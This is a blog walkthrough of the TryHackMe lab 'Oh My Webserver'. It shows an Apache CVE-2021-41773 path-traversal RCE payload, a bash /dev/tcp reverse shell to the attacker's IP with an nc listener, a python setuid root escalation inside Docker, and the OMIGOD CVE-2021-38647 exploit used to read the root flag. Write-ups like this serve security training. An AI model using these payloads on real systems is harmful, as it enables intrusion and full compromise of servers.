---
title: TryHackMe Oh My Webserver
date: 2022-03-09T10:50:11+05:30
lastmod: 2022-03-09T10:50:11+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://bit.ly/34sGFiK
cover:
  image: /img/ohmyweb.png
  alt: "cover image"
simg: /img/ohmyweb.png

categories:
  - TryHackMe
tags:
  - tryhackme
  - rooms
  - thm

draft: false
description: Try Hack Me Room oh-My-Webserver solved by Animesh Roy. this is a walkthrough. read more...

---

## OverView

This is a free room, which means anyone can deploy virtual machines in the room (without being subscribed)! 1682 users are in here and this room is 152 days old.

|||
|---|---|
| <script src="https://tryhackme.com/badge/434937"></script>| <a class="twitter-follow-button" href="https://twitter.com/anir0y" data-size="large"> Follow @anir0y<a>|
|oh-My-Webserver|![logo](https://tryhackme-images.s3.amazonaws.com/room-icons/c1833021c98fa6c74fc125f4b34741ca.png)|
| <b> oh-My-Webserver [FREE] </b>| [oh-My-Webserver](https://tryhackme.com/room/ohmyweb)|

## recon

### let's start with Nmap

```nmap
sudo nmap -sC -sV -oA initial-s1 10.10.216.165 -vv -Pn -n 

Starting Nmap 7.60 ( https://nmap.org ) at 2022-03-09 05:27 GMT
[snip]
Not shown: 998 filtered ports
Reason: 998 no-responses
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.49 ((Unix))
|_http-favicon: Unknown favicon MD5: 02FD5D10B62C7BC5AD03F8B0F105323C
| http-methods: 
|   Supported Methods: POST OPTIONS HEAD GET TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.49 (Unix)
|_http-title: Consult - Business Consultancy Agency Template | Home
MAC Address: 02:79:D4:48:D1:C7 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
[snip]

```

Nmap returns 2 port `80` and `22` Both are common ports and we will be start looking in Port 80 as this is where website/web-application will be listening and this is the common attack surface. 

the website looks like this:

![img](https://i.imgur.com/uUAukyM.png)

a static web-page nothing to go through.

let's run gobuster to get the dir structure first. 

returns following:

* assets/ 
* cgi-bin/

let's go with `cgi-bin` as this is where we might get some kind of `RCE` or `LFI` 

trying to access the URL returns `403`

![img](https://i.imgur.com/4AoSFyc.png)

**CVE-2021-41773**

The website is running Apache 2.4.49 and searching for exploits on that leads to `CVE-2021-41773` which is a path traversal and RCE exploit. 

ref : https://github.com/mr-exo/CVE-2021-41773

my payload for POC:

`curl 'http://10.10.216.165/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash' --data 'echo Content-Type: text/plain; echo; id'`

![img](https://i.imgur.com/P5bRHxs.png)

**hostname**

![img](https://i.imgur.com/OgxKE0j.png)


this confirms that server is indeed vulnerable for RCE!!!

## gaining first SHELL 

Okay let's get ourselves a shell, I'll be using [shell.anir0y.in](https://bit.ly/3sWdJwk)

* tty 1 : sending payload 

`curl 'http://10.10.216.165/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash' --data 'echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/10.17.4.40/9001 0>&1' `

* tty 2: listening for reverse call

`nc -lvnp 9001`

got the call back

![img](https://i.imgur.com/QZ88S9t.png)


## F*cking Docker 

turns out we're inside Doker container 

![img](https://i.imgur.com/x6Fdtvl.png)

and there is no flag inside docker. Bummer 😔

### Docker Enum 

Let's find out if Docker socket is mounted ?

`find / -name docker.sock 2>/dev/null`

well, turns out it's not 

let's do some basic recon before I go full Nmap with it.

|command | results | blah|
|---|:---:|---|
|hostname -I  | `172.17.0.2` | docker reserve IP pool| 
|arp -a | `ip-172-17-0-1.eu-west-1.compute.internal (172.17.0.1) at 02:42:59:70:2a:10 [ether] on eth0` | docker gateway most likely the host-mahine|
|getcap -r / 2>/dev/null| `/usr/bin/python3.7 = cap_setuid+ep` | check for capibilities  | 


* suid bin returns nothing so no mentioned in table. 

### Pwn3d Root in Docker ! all prasie to [GTFO bin](https://gtfobins.github.io/gtfobins/python/#capabilities)

`python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'’`

![img](https://i.imgur.com/XkfgiWA.png)

### user flag 

![img](https://i.imgur.com/txEbKgW.png)---

## ROOT ENUM 

running a web-server that have following serving at `10.17.4.40:80` :

* [nmap static binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap)
* [CVE-2021-38647.py](https://raw.githubusercontent.com/AlteredSecurity/CVE-2021-38647/main/CVE-2021-38647.py)

### uploading nmap 

`curl http://10.17.4.40/nmap -o /tmp/nmap` 

scan for all open ports in docker:



```bash
nmap 172.17.0.1 -p- --min-rate 5000
Nmap scan report for ip-172-17-0-1.eu-west-1.compute.internal (172.17.0.1)
Host is up (0.00042s latency).
Not shown: 65531 filtered ports
PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
5985/tcp closed unknown
5986/tcp open   unknown
```

got 2 unidentied ports one `open` one `closed`. let's start digging more for the open port. looks like `winrm` ?? but this is linux box so that's makes zero sense. 

### CVE-2021-38647;  OMIGOD on Azure UNIX/Linux VMs!

I had a little idea what OMI exploit is, kudos to `ippsec` and this github repo comes in handy with python exploit. 

https://github.com/AlteredSecurity/CVE-2021-38647

## PWN3ED R00T 

```bash
daemon@4a70924bafa0:/tmp$ python3 CVE-2021-38647.py -t 172.17.0.1 -c 'whoami;pwd;id;hostname;uname -a;cat /root/root*'
root
/var/opt/microsoft/scx/tmp
uid=0(root) gid=0(root) groups=0(root)
ubuntu
Linux ubuntu 5.4.0-88-generic #99-Ubuntu SMP Thu Sep 23 17:29:00 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
THM{FLAG_CONTENT}
```

## Conclusion 

well this is a fun box to play around. I did stucked multiple times before figuring out how to get root and YES!! I did try enumrating winrm stuffs before realising that's not gonna work and then looked for OMI Exploit. 